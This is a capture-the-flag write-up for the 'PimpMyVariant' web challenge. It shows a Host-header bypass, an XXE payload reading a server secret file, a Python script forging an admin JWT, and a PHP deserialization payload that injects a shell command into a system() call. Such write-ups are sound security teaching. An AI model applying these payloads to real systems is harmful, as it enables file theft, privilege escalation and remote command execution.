# PimpMyVariant (WEB)
### Solves : 77
## Introduction

So we fall on a page with covid variants list and apparently there's nothing in the page source code.

![image](https://user-images.githubusercontent.com/88440644/151672386-7af1f7b6-7bba-4889-aaaa-f0c2fed5faf8.png)

First thing we do is check robots.txt page. And we see that there's some endpoints :

![image](https://user-images.githubusercontent.com/88440644/151672246-e2ce96bf-05e0-467b-841b-7231a01b630b.png)

We saw the flag.txt and todo.txt but it's a rabbit hole :

![](https://cdn.discordapp.com/attachments/503921688657002516/937036562334617650/unknown.png)
![](https://cdn.discordapp.com/attachments/503921688657002516/937037397139546132/unknown.png)

So we want to check now the last three pages :
- /readme
- /new
- /log

But if we try to access them we get the following error :

![](https://cdn.discordapp.com/attachments/503921688657002516/937040834656895056/unknown.png)

## Hostname bypass

This step was pretty simple, we could bypass that by setting the **Host** header to `127.0.0.1`. I personally used ModHeader extension.

![image](https://user-images.githubusercontent.com/88440644/151671747-69b78037-d43f-4798-a51c-9c475e1f0299.png)

Now we get the location of the JWT secret, but we need to read this so let's find out how to do this.

## XXE Injection

By looking on the **/new** endpoint we see that we can submit a variant name that'll be add to the variants list :

![image](https://user-images.githubusercontent.com/88440644/151672156-a68f01e1-4d97-42d8-afae-2327666c2120.png)
![image](https://user-images.githubusercontent.com/88440644/151672171-a2df7ce3-646d-4b12-95a4-de99f455723d.png)

And if we look at the request made when we add a variant name we see that we're dealing with an XML request :

![image](https://user-images.githubusercontent.com/88440644/151672741-c0e427ab-21eb-42a7-a3a0-ee2777805e4d.png)

When a variant is added, a JWT token is generated that contains this variant name :

![image](https://user-images.githubusercontent.com/88440644/151673568-7b3d49bc-7354-4fb9-9a6c-44d1a26e5f45.png)

But now we need to exploit this XML request, and for that we want to exfiltrate the JWT secret file to be able to sign our own JWT token. To do this we'll use this XML payload that will put in the variant name the output of the file `jwt.secret.txt`:

```xml
<?xml version='1.0' encoding='utf-8'?>
<!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///www/jwt.secret.txt" >]>
<root>
  <name>
    &xxe;
  </name>
</root>
```

![image](https://user-images.githubusercontent.com/88440644/151672641-56a35f03-bf13-4737-9f6a-fbf32f1bce2f.png)

Now we can see that the JWT secret is in the variants list and in the JWT token :

  - 54b163783c46881f1fe7ee05f90334aa

![image](https://user-images.githubusercontent.com/88440644/151675675-e27843d0-4a57-46bd-8b55-ae8babbdbdd7.png)

## PHP Object Injection

So we can sign a token, and if you saw there was a serialized object in the JWT token with the parameter **isAdmin** set to 0 (false). Our goal is to modify this value to 1 (true) to be able to access **/log** endpoint because it's only accessible to *admin*. So let's forge a JWT token with **isAdmin** sets to **0** thanks to the python PyJWT library :

```python
import jwt
token = jwt.encode({
  "variants": [
    "Alpha"
  ],
  "settings": "a:1:{i:0;O:4:\"User\":3:{s:4:\"name\";s:4:\"Anon\";s:7:\"isAdmin\";b:1;s:2:\"id\";s:40:\"42357db6af31f5c6f4ce007059799a9a330f7c9f\";}}",
  "exp": 1643480307
}, "54b163783c46881f1fe7ee05f90334aa", algorithm="HS256")
print(token)
```
Output : 
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSJdLCJzZXR0aW5ncyI6ImE6MTp7aTowO086NDpcIlVzZXJcIjozOntzOjQ6XCJuYW1lXCI7czo0OlwiQW5vblwiO3M6NzpcImlzQWRtaW5cIjtiOjE7czoyOlwiaWRcIjtzOjQwOlwiNDIzNTdkYjZhZjMxZjVjNmY0Y2UwMDcwNTk3OTlhOWEzMzBmN2M5ZlwiO319IiwiZXhwIjoxNjQzNDgwMzA3fQ.3-nXabEL-8rS0LM-AlOAevCIx5UshlEeVeaFtyTuUTQ
```

Now we can try to access to **/log** and we get a logging error:

![image](https://user-images.githubusercontent.com/88440644/151676112-f87bee76-c0a1-4e25-8ec2-712bf9daa7e7.png)

So the error is the following :

```php
[2021-12-25 02:12:01] Fatal error: Uncaught Error: Bad system command call from UpdateLogViewer::read() from global scope in /www/log.php:36
Stack trace:
#0 {main}
  thrown in /www/log.php on line 37
#0 {UpdateLogViewer::read}
  thrown in /www/UpdateLogViewer.inc on line 26
```

We can see another interesting file which is `/www/UpdateLogViewer.inc` and we can download it directly from the website at http://pimpmyvariant.insomnihack.ch/UpdateLogViewer.inc :

```php
<?php

class UpdateLogViewer
{
	public string $packgeName;
	public string $logCmdReader;
	private static ?UpdateLogViewer $singleton = null;
	
	private function __construct(string $packgeName)
	{
		$this->packgeName = $packgeName;
		$this->logCmdReader = 'cat';
	}
	
	public static function instance() : UpdateLogViewer
	{
		if( !isset(self::$singleton) || self::$singleton === null ){
			$c = __CLASS__;
			self::$singleton = new $c("$c");
		}
		return self::$singleton;
	}
	
	public static function read():string
	{
		return system(self::logFile());
	}
	
	public static function logFile():string
	{
		return self::instance()->logCmdReader.' /var/log/UpdateLogViewer_'.self::instance()->packgeName.'.log';
	}
	
    public function __wakeup()// serialize
    {
    	self::$singleton = $this; 
    }
};
```

So now just by seeing the `system()` call in `read()` function we can guess that it's a PHP deserialization vulnerability, by default the code will `cat` the content of `packgeName` log file but these are values we can control in the deserialization process.

So to achieve our exploit we're going to append our desire object into the array deserialized. This can be possible because the class UpdateLogViewer is a singleton, so when we create our object with desired parameters, `UpdateLogViewer::instance()` is gonna grab our class containing our parameters.

```php
public static function logFile():string
{
  return self::instance()->logCmdReader.' /var/log/UpdateLogViewer_'.self::instance()->packgeName.'.log';
}
```
The returned value is executed by `system()` so we can imagine the command executed behind to display the content of the current directory :

```php
system('cat *; /var/log/UpdateLogViewer_x.log');
```

So we craft our serialized object like that :

```php
a:2:{i:0;O:4:"User":3:{s:4:"name";s:4:"Anon";s:7:"isAdmin";b:1;s:2:"id";s:40:"bec9b80a3ed0ee3f0463d68bdef1128de828acb5";}i:1;O:15:"UpdateLogViewer":2:{s:10:"packgeName";s:1:"x";s:12:"logCmdReader";s:6:"cat *;";}}
```

We forge another token with that data and we get a new token :
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ2YXJpYW50cyI6WyJBbHBoYSJdLCJzZXR0aW5ncyI6ImE6Mjp7aTowO086NDpcIlVzZXJcIjozOntzOjQ6XCJuYW1lXCI7czo0OlwiQW5vblwiO3M6NzpcImlzQWRtaW5cIjtiOjE7czoyOlwiaWRcIjtzOjQwOlwiYmVjOWI4MGEzZWQwZWUzZjA0NjNkNjhiZGVmMTEyOGRlODI4YWNiNVwiO31pOjE7TzoxNTpcIlVwZGF0ZUxvZ1ZpZXdlclwiOjI6e3M6MTA6XCJwYWNrZ2VOYW1lXCI7czoxOlwieFwiO3M6MTI6XCJsb2dDbWRSZWFkZXJcIjtzOjY6XCJjYXQgKjtcIjt9fSIsImV4cCI6MTY0MzQ4MDMwN30.aDkxHvE53Wmy2BawAGWWrg868TMK1Sr_73ZL6cLbYLM
```

Now if we refresh the **/log** page we can get the flag that is displayed : `INS{P!mpmYV4rianThat's1flag}`

*Hope you enjoy, have a very good day !*
